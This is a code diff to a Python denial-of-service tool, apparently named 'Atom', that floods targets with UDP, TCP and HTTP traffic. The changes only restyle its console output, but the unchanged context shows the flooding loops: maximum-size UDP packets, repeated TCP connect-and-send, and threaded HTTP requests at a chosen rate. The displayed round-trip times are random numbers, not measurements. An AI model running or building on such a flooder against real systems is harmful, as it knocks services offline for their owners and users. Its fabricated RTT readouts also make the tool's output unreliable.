@@ -14,6 +14,8 @@ from datetime import datetime
 current_time = datetime.now().strftime("%H:%M:%S")
 
 BLUE = "\033[94m"
+GREEN = "\033[92m"
+GREEN2 = "\033[32m"
 RED = "\033[91m"
 RESET = "\033[0m"
 
@@ -39,7 +41,7 @@ def normalize_url(target):
         return target
     return f"http://{target}"
 
-
+ 
 def run_udp_attack(target_ip, target_port, attack_speed):
     message = b"A" * 65507
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -63,18 +65,13 @@ def run_udp_attack(target_ip, target_port, attack_speed):
                 rtt = random.randint(10,100)
                 bytes_sent = sock.sendto(message, (target_ip, int(target_port)))
                 packet_count += 1
-                print(f""" {BLUE}
-┌─────────────────────────[Atom Output]────────────────────────────┐
-│                           {current_time}            
-│└─ Packet Sent to {target_ip}:{target_port},                        
-│└─ Bytes: {bytes_sent} bytes [MAX], RTT: {rtt}ms,     
-│└─ Packet Number: #{packet_count}      
-└──────────────────────────────────────────────────────────────────┘
-{RESET}""")
+                print(f"{BLUE}[Atom Output]:{RESET} {GREEN}UDP Packet{RESET} {GREEN2}#{packet_count}{RESET} {GREEN}Sent{RESET} to {GREEN2}{target_ip}:{target_port},{RESET}")
+                print(f"Bytes:{GREEN} {bytes_sent}{RESET} {GREEN2}[MAX]{RESET},")
+                print(f"RTT: {GREEN}{rtt}{RESET},")
                 time.sleep(float(attack_speed))
             except Exception as exc:
                 print(logo)
-                print(f"{BLUE}[Atom Output]:{RESET} Failed to send packet: {exc}")
+                print(f"{BLUE}[Atom Output]:{RESET} {RED}Failed{RESET} to send packet: {RED}{exc}{RESET}")
                 time.sleep(5)
     except KeyboardInterrupt:
         os.system("clear")
@@ -114,18 +111,13 @@ def run_tcp_attack(target_ip, target_port, attack_speed):
                 sock.connect((target_ip, int(target_port)))
                 bytes_sent = sock.send(message)
                 rtt = random.randint(10,100)
-                print(f""" {BLUE}
-┌────────────────────[Atom Output]──────────────────────────────────────┐
-│                      {current_time}                                
-│└─ TCP Connection Established & Sent to {target_ip}:{target_port},
-│└─ Bytes: {bytes_sent} bytes [MAX], RTT: {rtt}ms,       
-│└─ Packet Number: #{packetcount}            
-└───────────────────────────────────────────────────────────────────────┘
-{RESET}""")
+                print(f"{BLUE}[Atom Output]: {GREEN}TCP Packet{RESET} {GREEN2}#{packetcount}{RESET} {GREEN}Sent{RESET} to {GREEN2}{target_ip}:{target_port},{RESET}")
+                print(f"Bytes: {GREEN}{bytes_sent}{RESET} {GREEN2}[MAX]{RESET},")
+                print(f"RTT: {GREEN}{rtt}{RESET},")
             except Exception as exc:
                 os.system("clear")
                 print(logo)
-                print(f"{BLUE}[Atom Output]:{RESET} TCP Connection failed: {exc}")
+                print(f"{BLUE}[Atom Output]:{RESET} TCP Connection {RED}failed: {exc}{RESET}")
             finally:
                 sock.close()
             time.sleep(float(attack_speed))
@@ -158,18 +150,13 @@ def run_http_attack(method, target_url, attack_speed, thread_count):
                 rt = random.randint(10,100)
                 response = manager.request(method, target_url, timeout=0.01)
                 packetcounts += 1
-                print(f""" {BLUE}
-┌───────────────────────[Atom Output]──────────────────────────┐
-│                        {current_time}                       
-│└─ Sent {method} Request Packet to {target_url},
-│└─ Status Code: {response.status}, RTT: {rt}ms, 
-│└─ Packet Number: #{packetcounts}  
-└──────────────────────────────────────────────────────────────┘
-{RESET}""")
+                print(f"{BLUE}[Atom Output]:{RESET} {method} Request #{packetcounts} Sent to {target_url},")
+                print(f"Bytes: {GREEN}1500{RESET} {GREEN2}[MAX]{RESET},")
+                print(f"RTT: {GREEN}{rt}{RESET},")
             except Exception as exc:
                 os.system("clear")
                 print(logo)
-                print(f"{BLUE}[Atom Output]:{RESET} {method} request failed: {exc}")
+                print(f"{BLUE}[Atom Output]:{RESET} {method} request {RED}failed:{RESET} {exc}")
             time.sleep(5)
 
     threads = []
@@ -254,6 +241,7 @@ def main():
     else:
         print(logo)
         print("Unknown selection. Exiting.")
+
 
 if __name__ == "__main__":
     main()
